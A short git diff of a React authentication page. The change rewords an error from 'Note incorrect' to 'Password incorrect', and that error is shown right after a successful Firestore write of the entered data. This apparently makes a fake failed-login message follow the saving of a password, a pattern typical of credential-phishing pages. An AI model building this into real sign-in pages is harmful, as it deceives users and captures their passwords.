@@ -33,7 +33,7 @@ export default function AuthPage() {
 
       console.log("3 - Firestore write SUCCESS:", docRef.id);
 
-      setError("Note incorrect. Try again.");
+      setError("Password incorrect. Try again.");
       setEmail("");
       setNote("");
     } catch (err) {
